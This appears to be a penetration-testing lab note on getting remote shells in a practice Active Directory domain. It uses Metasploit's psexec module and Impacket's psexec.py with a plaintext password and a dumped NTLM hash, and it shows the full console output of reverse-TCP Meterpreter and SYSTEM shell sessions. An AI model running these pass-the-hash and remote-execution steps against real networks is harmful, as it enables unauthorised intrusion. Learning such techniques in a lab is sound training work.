1. We can get shell using a password and a username 

![](https://i.imgur.com/NZjEBIr.png)

2. We can gain shell access with the SAM dumped hash we got from the smb relay attack

![](https://i.imgur.com/wWJPEWY.png)

> Metasploit is mostly noisy which might get picked up by an antivirus, that is why we have other tools like `psexec.py` which is a little bit noisy
> 

1. Same as we can gain access with password and usernames using metasploit, we can use `psexec.py`

![](https://i.imgur.com/RrMmz5y.png)

2. We can also get shell though hashes

![](https://i.imgur.com/FqMWCNX.png)

# Practical

1. Metasploit

```shell
sec-fortress@Pwn-F0rk-3X3C:~/PEH/AD$ msfconsole
[*] Starting the Metasploit FraMework console...%

msf6 > use exploit/windows/smb/psexec
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
```

```shell
msf6 exploit(windows/smb/psexec) > options

Module options (exploit/windows/smb/psexec):

   Name                  Current Setting  Required  Description
   ----                  ---------------  --------  -----------
   RHOSTS                                 yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT                 445              yes       The SMB service port (TCP)
   SERVICE_DESCRIPTION                    no        Service description to be used on target for pretty listing
   SERVICE_DISPLAY_NAME                   no        The service display name
   SERVICE_NAME                           no        The service name
   SMBDomain             .                no        The Windows domain to use for authentication
   SMBPass                                no        The password for the specified username
   SMBSHARE                               no        The share to connect to, can be an admin share (ADMIN$,C$,...) or a normal read/write folder share
   SMBUser                                no        The username to authenticate as


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     192.168.0.157    yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port

Exploit target:

   Id  Name
   --  ----
   0   Automatic

View the full module info with the info, or info -d command.

msf6 exploit(windows/smb/psexec) > set payload windows/x64/meterpreter/reverse_tcp
payload => windows/x64/meterpreter/reverse_tcp
```

```shell
msf6 exploit(windows/smb/psexec) > set rhosts 192.168.0.166
rhosts => 192.168.0.166
msf6 exploit(windows/smb/psexec) > set smbdomain MARVEL.local
smbdomain => MARVEL.local
msf6 exploit(windows/smb/psexec) > set smbuser fcastle
smbuser => fcastle
msf6 exploit(windows/smb/psexec) > set smbpass Password1
smbpass => Password1
```

```shell
msf6 exploit(windows/smb/psexec) > show targets

Exploit targets:
=================

    Id  Name
    --  ----
=>  0   Automatic
    1   PowerShell
    2   Native upload
    3   MOF upload
    4   Command
```

It is better to choose `Native upload` for the targets if you have failed on `Automatic` 

```shell
msf6 exploit(windows/smb/psexec) > exploit

[*] Started reverse TCP handler on 192.168.0.157:4444 
[*] 192.168.0.166:445 - Connecting to the server...
[*] 192.168.0.166:445 - Authenticating to 192.168.0.166:445|MARVEL.local as user 'fcastle'...
[*] 192.168.0.166:445 - Selecting PowerShell target
[*] 192.168.0.166:445 - Executing the payload...
[+] 192.168.0.166:445 - Service start timed out, OK if running a command or non-service executable...
[*] Sending stage (200774 bytes) to 192.168.0.166
[*] Meterpreter session 1 opened (192.168.0.157:4444 -> 192.168.0.166:56193) at 2023-09-16 16:25:05 -0400

meterpreter > 
```

Now we need to do a hash attack so background this session

```shell
meterpreter > background
[*] Backgrounding session 1...
msf6 exploit(windows/smb/psexec) > 
```

```shell
msf6 exploit(windows/smb/psexec) > set smbuser administrator
smbuser => administrator
msf6 exploit(windows/smb/psexec) > unset smbdomain
Unsetting smbdomain...
[!] Variable "smbdomain" unset - but will use a default value still. If this is not desired, set it to a new value or attempt to clear it with set --clear smbdomain
```

Now we need our hash, Note that the **NT** part of this hash is the most important, but we need to select both the **LM** and **NT** part for this attack

![](https://i.imgur.com/c8XeAIx.png)

```shell
msf6 exploit(windows/smb/psexec) > set smbpass aad3b435b51404eeaad3b435b51404ee:7facdc498ed1680c4fd1448319a8c04f
smbpass => aad3b435b51404eeaad3b435b51404ee:7facdc498ed1680c4fd1448319a8c04f
msf6 exploit(windows/smb/psexec) > exploit

[*] Started reverse TCP handler on 192.168.0.157:4444 
[*] 192.168.0.166:445 - Connecting to the server...
[*] 192.168.0.166:445 - Authenticating to 192.168.0.166:445 as user 'administrator'...
[*] 192.168.0.166:445 - Selecting PowerShell target
[*] 192.168.0.166:445 - Executing the payload...
[+] 192.168.0.166:445 - Service start timed out, OK if running a command or non-service executable...
[*] Sending stage (200774 bytes) to 192.168.0.166
[*] Meterpreter session 3 opened (192.168.0.157:4444 -> 192.168.0.166:54623) at 2023-09-16 17:47:14 -0400

meterpreter > 
```

2. Psexec.py

We can get shell on target system, using this syntax :

```shell
sec-fortress@Pwn-F0rk-3X3C:~/PEH/AD$ psexec.py MARVEL/fcastle:'Password1'@192.168.0.166

Impacket v0.9.19 - Copyright 2019 SecureAuth Corporation

[*] Requesting shares on 192.168.0.166.....
[*] Found writable share ADMIN$
[*] Uploading file fsodQFwB.exe
[*] Opening SVCManager on 192.168.0.166.....
[*] Creating service fqSt on 192.168.0.166.....
[*] Starting service fqSt.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.19045.2006]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32>
```